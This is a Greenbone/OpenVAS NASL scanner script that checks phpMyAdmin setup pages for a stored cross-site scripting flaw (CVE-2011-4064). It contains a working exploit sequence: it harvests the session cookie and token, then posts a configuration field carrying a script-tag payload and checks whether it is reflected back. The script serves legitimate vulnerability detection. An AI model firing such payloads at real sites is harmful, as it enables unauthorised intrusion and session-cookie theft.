# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:phpmyadmin:phpmyadmin";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902585");
  script_version("2023-10-27T05:05:28+0000");
  script_cve_id("CVE-2011-4064");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2023-10-27 05:05:28 +0000 (Fri, 27 Oct 2023)");
  script_tag(name:"creation_date", value:"2011-11-22 17:17:17 +0530 (Tue, 22 Nov 2011)");
  script_name("phpMyAdmin Setup Interface Cross Site Scripting Vulnerability");
  script_tag(name:"qod_type", value:"remote_analysis");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_phpmyadmin_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("phpMyAdmin/installed");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to insert arbitrary HTML
  and script code, which will be executed in a user's browser session in the context of an affected site.");

  script_tag(name:"affected", value:"phpMyAdmin versions 3.4.x before 3.4.6.");
  script_tag(name:"insight", value:"The flaw is due to improper validation of user-supplied input
  via the 'Servers-0-verbose' parameter to setup/index.php, which allows
  attackers to execute arbitrary HTML and script code in a user's browser
  session in the context of an affected site.");

  script_tag(name:"solution", value:"Upgrade to phpMyAdmin version 3.4.6 or later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"summary", value:"phpMyAdmin is prone to a cross-site scripting (XSS) vulnerability.");

  script_xref(name:"URL", value:"http://secunia.com/advisories/46431");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/50175");
  script_xref(name:"URL", value:"http://securitytracker.com/id/1026199");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/70681");
  script_xref(name:"URL", value:"http://www.phpmyadmin.net/home_page/security/PMASA-2011-16.php");
  script_xref(name:"URL", value:"http://hauntit.blogspot.com/2011/09/stored-xss-in-phpmyadmin-345-all.html");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE))exit(0);
if(!dir = get_app_location(cpe:CPE, port:port))exit(0);

host = http_host_name( port:port );

url = "/setup/index.php?tab_hash=&check_page_refresh=1&page=servers&mode=" +
      "add&submit=New+server";
req = http_get(item:dir+url,  port:port);
res = http_keepalive_send_recv(port:port, data:req);

cookie = eregmatch(pattern:"Set-Cookie: ([^;]*);", string:res);
if(isnull(cookie[1])) {
  exit(0);
}
cookie = cookie[1];

token = eregmatch(pattern:'name="token" value="([a-zA-Z0-9]+)"', string:res);
if(isnull(token[1])) {
  exit(0);
}
token = token[1];

data = string("tab_hash=&check_page_refresh=1&token=", token, "&Servers-0-",
              "verbose=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E",
              "&Servers-0-host=localhost&Servers-0-port=&Servers-0-socket=&S",
              "ervers-0-connect_type=tcp&Servers-0-extension=mysqli&submit_s",
              "ave=Save&Servers-0-auth_type=cookie&Servers-0-user=root&Serve",
              "rs-0-password=&Servers-0-auth_swekey_config=&Servers-0-auth_h",
              "ttp_realm=&Servers-0-SignonSession=&Servers-0-SignonURL=&Serv",
              "ers-0-LogoutURL=&Servers-0-only_db=&Servers-0-only_db-userpre",
              "fs-allow=on&Servers-0-hide_db=&Servers-0-hide_db-userprefs-al",
              "low=on&Servers-0-AllowRoot=on&Servers-0-DisableIS=on&Servers-",
              "0-AllowDeny-order=&Servers-0-AllowDeny-rules=&Servers-0-ShowD",
              "atabasesCommand=SHOW+DATABASES&Servers-0-pmadb=&Servers-0-con",
              "troluser=&Servers-0-controlpass=&Servers-0-verbose_check=on&S",
              "ervers-0-bookmarktable=&Servers-0-relation=&Servers-0-usercon",
              "fig=&Servers-0-table_info=&Servers-0-column_info=&Servers-0-h",
              "istory=&Servers-0-tracking=&Servers-0-table_coords=&Servers-0",
              "-pdf_pages=&Servers-0-designer_coords=&Servers-0-tracking_def",
              "ault_statements=CREATE+TABLE%2CALTER+TABLE%2CDROP+TABLE%2CREN",
              "AME+TABLE%2CCREATE+INDEX%2CDROP+INDEX%2CINSERT%2CUPDATE%2CDEL",
              "ETE%2CTRUNCATE%2CREPLACE%2CCREATE+VIEW%2CALTER+VIEW%2CDROP+VI",
              "EW%2CCREATE+DATABASE%2CALTER+DATABASE%2CDROP+DATABASE&Servers",
              "-0-tracking_add_drop_view=on&Servers-0-tracking_add_drop_tabl",
              "e=on&Servers-0-tracking_add_drop_database=on");

url = string(dir, '/setup/index.php?tab_hash=&check_page_refresh=1',
             '&token=', token, '&page=servers&mode=add&submit=New+server');

req = string("POST ", url, " HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "User-Agent: ", http_get_user_agent(), "\r\n",
             "Cookie: ", cookie, "\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n",
             "Content-Length: ", strlen(data), "\r\n\r\n", data);
res = http_keepalive_send_recv(port:port, data:req);

if(res =~ "^HTTP/1.[01] 30")
{
  req = http_get(item:string(dir,"/setup/index.php"), port:port);
  req = string(chomp(req), '\r\nCookie: ', cookie, '\r\n\r\n');
  res = http_keepalive_send_recv(port:port, data:req);

  if(res =~ "^HTTP/1\.[01] 200" && "Use SSL (<script>alert(document.cookie)</script>)" >< res){
    security_message(port);
  }
}
